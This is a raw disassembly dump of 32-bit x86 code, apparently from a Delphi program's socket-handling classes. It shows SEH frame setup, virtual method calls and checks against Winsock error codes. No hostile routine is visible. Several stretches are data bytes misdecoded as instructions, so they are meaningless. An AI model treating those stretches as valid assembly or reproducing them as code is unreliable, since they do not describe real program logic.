sbb al 0x0
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
jae r-xdata
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
int3
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45180040 ] al
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
push eax
inc eax
add [ eax ] al
int1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int1
inc edi
add [ ebx - 0x74307500 ] cl
salc
call sub_45b6a4
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
add [ eax ] al
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45130040 ] al
dec ecx
dec ecx
outsb
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x74726f50
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
push eax
shl [ ecx + esi * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int1
inc ebp
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
mov dl 0x1
mov eax ebx
call sub_45f774
sub_45f142
inc ebp
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45180040 ] al
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45130040 ] al
dec ecx
dec ecx
outsb
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x74726f50
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
int3
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_45b6a4
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_45f774
sub_45f184
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_45f1aa
inc ebp
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45130040 ] al
dec ecx
dec ecx
outsb
jbe r-xdata
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_45b6a4
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_45f774
sub_45f1e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_45b6a4
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_45f774
sub_45f250
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_45f72c
mov eax ebx
call sub_45f750
sub_45f288
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414afc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_45f2b8
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_45f2dc
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_45f300
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b650
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_45f340
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_45f36c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45f480
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_45f7a4
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f487
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404074
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_45f7f8
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
jmp r-xdata
sub_45f48c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_4040a4
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
sub_45f4a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b650
pop esi
pop ebx
retn
sub_45f4d0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov dl 0x1
mov eax edi
call sub_45f774
lea eax [ edi + 0x1c ]
push eax
lea ecx [ edi + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov esi eax
push 0x1
mov [ esp + 0x4 ] 0x2714
mov [ esp + 0x8 ] 0x2736
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45b65c
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ edi + 0xc ] esi
mov [ edi + 0x10 ] 0x1
mov eax edi
call sub_45f72c
mov eax edi
call sub_45f750
sub_45f544
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_414ac4
mov dl 0x1
mov eax edi
call sub_45f774
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45f59c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45f6cd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_45daa0
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45f6b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414014
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_45da5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403294
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_45f59c
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_45f59c
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f6d4
lea eax [ ebp - 0xc ]
call sub_404050
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_45f6e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4031dc
mov edi eax
mov eax esi
call sub_4031dc
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_4040a4
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_4040a4
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_41476c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45f72c
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_45f750
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_45f774
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_404050
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_404050
xor eax eax
mov [ ebx + 0x1c ] eax
sub_45f7a4
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b65c
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_45f72c
sub_45f7f8
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_45f7a4
test al al
je r-xdata
sub_45f828
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx ecx
mov esi edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45f89d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_414014
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_45da5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f8a4
mov eax [ ebp - 0x8 ]
call sub_403294
retn
sub_45f8d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_4151a0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45f920
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45f945
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f94c
retn
sub_45fc58
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_45fc7c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
mov [ esi + 0x38 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45fcb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
push 0x0
push 0x0
mov eax esi
call sub_41664c
sub_45fce8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
push 0x0
push 0x0
mov eax esi
call sub_41664c
sub_45fd18
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ac60
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x34 ]
jne r-xdata
xor eax eax
mov [ esi + 0x34 ] eax
sub_45fd8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45fdb1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fdb8
retn
sub_45fffc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414ac4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x10 ] eax
mov eax esi
call sub_45ffe0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_460048
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
lea eax [ esi + 0x10 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414afc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_460078
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4601bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404050
cmp [ ebx + 0xc ] 0x0
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404050
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4601c4
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_404074
retn
mov edx esi
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ esi ]
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0xc ]
call sub_407f48
push [ ebp - 0x1c ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4043d0
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
push [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0xc ]
call sub_407f48
push [ ebp - 0x14 ]
push r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x18 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4043d0
push [ esi ]
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
call sub_407f48
push [ ebp - 0xc ]
push r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x10 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4043d0
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax [ ebp - 0x4 ]
jle r-xdata
jmp r-xdata
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
sub_4601f0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4602eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45ffe0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4602f2
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_404074
retn
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx 0x4
mov edx 0x1
call sub_404570
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407e14
mov eax [ ebp - 0xc ]
call sub_404310
cmp eax 0x4
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax esi
call sub_460398
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
inc ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40469c
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x5
call sub_404570
mov edx [ ebp - 0x18 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
sub_4602fc
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jg r-xdata
mov al 0x1
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
xor eax eax
pop ebx
retn
sub_46031c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460367
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebx + 0xc ] esi
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46036e
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_407f48
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x14 ]
call sub_4040a4
sub_460398
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_4040a4
mov eax esi
call sub_404310
test eax eax
jle r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_4080c0
mov [ ebx + 0xc ] eax
sub_4603c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_4151a0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_460400
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_414eb0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_460448
mov [ esp ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_460448
cmp ebp [ eax + 0xc ]
jne r-xdata
sub_46045c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov esi eax
test esi esi
je r-xdata
mov edx [ esi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_46048c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4604b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4604b8
retn
sub_4604c8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x5
inc esi
add [ eax ] cl
add [ eax ] al
add [ edx + 0x41 ] ah
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x66600040 ] al
inc ecx
add [ esi + 0x66c40041 ] ch
inc ecx
add [ eax + 0x5540046 ] bh
inc esi
add [ eax + 0x5 ] dl
inc esi
add al ch
inc ecx
add [ esp + edx * 2 ] cl
dec ecx
push esp
inc ebx
push eax
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add eax 0xc0046
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
